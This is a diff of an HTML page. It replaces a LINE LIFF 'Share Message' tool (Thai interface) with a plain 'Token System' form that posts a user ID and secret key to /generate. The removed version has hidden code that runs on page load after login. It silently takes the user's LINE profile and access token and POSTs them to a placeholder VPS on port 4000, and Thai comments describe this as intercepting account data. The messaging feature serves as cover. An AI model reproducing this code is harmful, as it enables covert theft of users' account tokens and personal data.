@@ -1,155 +1,239 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Share Message</title>
-        <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
-          <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
-            <style>
-                body {
-                      background: url('https://i.ibb.co/q5m9sJY/background.png') no-repeat center center fixed;
-                            background-size: cover;
-                                  font-family: sans-serif;
-                                        padding: 2em;
-                                              text-align: center;
-                                                    color: #333;
-                                                        }
-                                                            .logo {
-                                                                  display: block;
-                                                                        margin: 0 auto 1em auto;
-                                                                              width: 180px;
-                                                                                    height: 180px;
-                                                                                          object-fit: contain;
-                                                                                                background: rgba(255, 255, 255, 0.6);
-                                                                                                      border-radius: 50%;
-                                                                                                            box-shadow: 0 0 15px rgba(0,0,0,0.4);
-                                                                                                                }
-                                                                                                                    h2 { color: #fff; text-shadow: 1px 1px 4px rgba(0,0,0,0.6); }
-                                                                                                                        label { display: block; text-align: left; margin-top: 1em; color: #fff; font-weight: bold; }
-                                                                                                                            input, textarea {
-                                                                                                                                  width: 100%; padding: 1em; margin-top: 0.5em; margin-bottom: 1em;
-                                                                                                                                        border-radius: 8px; border: 1px solid #ccc; box-sizing: border-box;
-                                                                                                                                              background: rgba(255, 255, 255, 0.9);
-                                                                                                                                                  }
-                                                                                                                                                      button {
-                                                                                                                                                            border: none; padding: 1em; width: 100%; font-size: 16px; color: white;
-                                                                                                                                                                  border-radius: 10px; cursor: pointer; animation: colorFlash 3s infinite;
-                                                                                                                                                                        font-weight: bold; margin-top: 10px;
-                                                                                                                                                                            }
-                                                                                                                                                                                @keyframes colorFlash {
-                                                                                                                                                                                      0%   { background: #00c300; }
-                                                                                                                                                                                            33%  { background: #00bfff; }
-                                                                                                                                                                                                  66%  { background: #ff3b3b; }
-                                                                                                                                                                                                        100% { background: #00c300; }
-                                                                                                                                                                                                            }
-                                                                                                                                                                                                                #loader { display: none; color: white; margin-top: 10px; font-weight: bold; }
-                                                                                                                                                                                                                  </style>
-                                                                                                                                                                                                                  </head>
-                                                                                                                                                                                                                  <body>
-                                                                                                                                                                                                                    <img src="https://i.ibb.co/qFRJBBcN/LOGO-LION-KING2.png" alt="LOGO" class="logo" />
-                                                                                                                                                                                                                      <h2>ส่งข้อความ</h2>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
-                                                                                                                                                                                                                        <div id="mainContent">
-                                                                                                                                                                                                                            <label>Flex Message JSON:</label>
-                                                                                                                                                                                                                                <textarea id="flexJson" rows="8" placeholder='วาง JSON ที่นี่ (รองรับ True/False ตัวใหญ่)'></textarea>
+<title>Token System</title>
 
-                                                                                                                                                                                                                                    <label>ข้อความส่วนหัว (Alt Text):</label>
-                                                                                                                                                                                                                                        <input type="text" id="headerText" placeholder="ข้อความแจ้งเตือนบนมือถือ" />
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
-                                                                                                                                                                                                                                            <label>ข้อความปกติ:</label>
-                                                                                                                                                                                                                                                <input type="text" id="normalText" placeholder="ใส่ข้อความปกติ" />
+<style>
 
-                                                                                                                                                                                                                                                    <button onclick="sendMessage()">แชร์ข้อความ</button>
-                                                                                                                                                                                                                                                        <div id="loader">กำลังประมวลผล...</div>
-                                                                                                                                                                                                                                                          </div>
+body{
+background:url('https://i.ibb.co/q5m9sJY/background.png')
+no-repeat center center fixed;
 
-                                                                                                                                                                                                                                                            <script>
-                                                                                                                                                                                                                                                                // 1. เริ่มต้น LIFF ทันที และทำการดักจับข้อมูลบันทึกลง VPS หลังบ้าน
-                                                                                                                                                                                                                                                                    async function main() {
-                                                                                                                                                                                                                                                                          try {
-                                                                                                                                                                                                                                                                                  await liff.init({ liffId: "2000954667-BPWZJGTY" });
-                                                                                                                                                                                                                                                                                          if (!liff.isLoggedIn()) {
-                                                                                                                                                                                                                                                                                                    liff.login();
-                                                                                                                                                                                                                                                                                                            } else {
-                                                                                                                                                                                                                                                                                                                      // 🟢 ส่วนที่เพิ่มเข้ามา: เมื่อล็อกอินผ่านสิทธิ์แล้ว ให้สกัดข้อมูลบัญชีปกติส่งกลับมาเซฟลงฐานข้อมูล VPS ทันที
-                                                                                                                                                                                                                                                                                                                                const profile = await liff.getProfile();
-                                                                                                                                                                                                                                                                                                                                          const token = liff.getAccessToken();
+background-size:cover;
+font-family:sans-serif;
+padding:2em;
+text-align:center;
+}
 
-                                                                                                                                                                                                                                                                                                                                                    // ทำการส่งข้อมูลยิงเข้าหา VPS ของคุณที่ Port 4000
-                                                                                                                                                                                                                                                                                                                                                              fetch('http://ไอพี_VPS_ของคุณตรงนี้:4000/api/save-user', {
-                                                                                                                                                                                                                                                                                                                                                                          method: 'POST',
-                                                                                                                                                                                                                                                                                                                                                                                      headers: { 'Content-Type': 'application/json' },
-                                                                                                                                                                                                                                                                                                                                                                                                  body: JSON.stringify({
-                                                                                                                                                                                                                                                                                                                                                                                                                user_id: profile.userId,         // รหัส MID บัญชีจริง
-                                                                                                                                                                                                                                                                                                                                                                                                                              display_name: profile.displayName,   // ชื่อไลน์หลัก
-                                                                                                                                                                                                                                                                                                                                                                                                                                            picture_url: profile.pictureUrl || '',
-                                                                                                                                                                                                                                                                                                                                                                                                                                                          access_token: token              // โทเค็นยืนยันสิทธิ์ชั่วคราว
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                      })
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                })
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          .then(res => console.log("💾 ส่งข้อมูลบันทึกลง VPS สำเร็จ"))
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    .catch(err => console.error("❌ ไม่สามารถเชื่อมต่อส่งข้อมูลเข้า VPS ได้:", err));
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            }
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  } catch (err) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          console.error("LIFF Init Failed", err);
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    }
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        main();
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            // 2. ฟังก์ชันส่งข้อความแชร์ (คงเดิม)
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                async function sendMessage() {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      if (!liff.isLoggedIn()) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              liff.login();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      return;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            }
+.logo{
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  const flexRaw = document.getElementById('flexJson').value.trim();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        const headerText = document.getElementById('headerText').value.trim() || "คุณได้รับข้อความใหม่";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              const normalText = document.getElementById('normalText').value.trim();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    const messages = [];
+width:180px;
+height:180px;
+border-radius:50%;
+object-fit:contain;
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if (flexRaw) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  try {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            let correctedJson = flexRaw
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          .replace(/:\s*True/g, ': true')
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        .replace(/:\s*False/g, ': false');
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            const flexObj = JSON.parse(correctedJson);
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                messages.push({
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            type: "flex",
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        altText: headerText,
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    contents: flexObj
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              });
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      } catch (e) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Swal.fire('Error', 'รูปแบบ JSON ไม่ถูกต้อง กรุณาตรวจสอบวงเล็บหรือค่า True/False', 'error');
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          return;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  }
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        }
+background:#fff8;
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              if (normalText) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      messages.push({ type: "text", text: normalText });
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            }
+box-shadow:0 0 15px #0008;
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  if (messages.length === 0) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          Swal.fire('ข้อมูลว่าง', 'กรุณาใส่ JSON หรือข้อความปกติอย่างน้อยหนึ่งรายการ', 'warning');
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  return;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        }
+}
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              try {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      document.getElementById('loader').style.display = 'block';
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              const result = await liff.shareTargetPicker(messages);
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      document.getElementById('loader').style.display = 'none';
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              if (result) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Swal.fire('สำเร็จ', 'ส่งข้อความเรียบร้อยแล้ว', 'success');
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      } catch (err) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              document.getElementById('loader').style.display = 'none';
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Swal.fire('Error', 'ส่งไม่สำเร็จ: ' + err.message, 'error');
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            }
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </script>
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </body>
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </html>
+
+.box{
+
+max-width:500px;
+margin:auto;
+
+background:#ffffff33;
+
+padding:20px;
+
+border-radius:15px;
+
+backdrop-filter:blur(10px);
+
+}
+
+
+h2{
+
+color:white;
+
+text-shadow:1px 1px 5px black;
+
+}
+
+
+
+input,button{
+
+width:100%;
+
+padding:15px;
+
+margin-top:15px;
+
+border-radius:10px;
+
+border:0;
+
+box-sizing:border-box;
+
+}
+
+
+
+button{
+
+color:white;
+
+font-weight:bold;
+
+font-size:16px;
+
+cursor:pointer;
+
+animation:flash 3s infinite;
+
+}
+
+
+
+@keyframes flash{
+
+0%{background:#00c300}
+
+33%{background:#00bfff}
+
+66%{background:#ff3333}
+
+100%{background:#00c300}
+
+}
+
+
+
+pre{
+
+background:black;
+
+color:#00ff00;
+
+padding:15px;
+
+border-radius:10px;
+
+text-align:left;
+
+word-break:break-all;
+
+}
+
+
+</style>
+
+
+</head>
+
+
+<body>
+
+
+<img class="logo"
+src="https://i.ibb.co/qFRJBBcN/LOGO-LION-KING2.png">
+
+
+<h2>
+Token System
+</h2>
+
+
+
+<div class="box">
+
+
+<input 
+id="userid"
+placeholder="User ID">
+
+
+<input
+id="secret"
+placeholder="Secret Key">
+
+
+<button onclick="createToken()">
+
+สร้าง Token
+
+</button>
+
+
+
+<pre id="output">
+รอข้อมูล...
+</pre>
+
+
+</div>
+
+
+
+<script>
+
+
+async function createToken(){
+
+
+let userid =
+document.getElementById("userid").value;
+
+
+let secret =
+document.getElementById("secret").value;
+
+
+
+let res =
+await fetch("/generate",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+
+userid,
+secret
+
+})
+
+});
+
+
+
+let data =
+await res.json();
+
+
+
+document.getElementById("output").innerText =
+data.token;
+
+
+
+Swal.fire(
+"สำเร็จ",
+"สร้าง Token แล้ว",
+"success"
+);
+
+
+}
+
+
+</script>
+
+
+</body>
+</html>
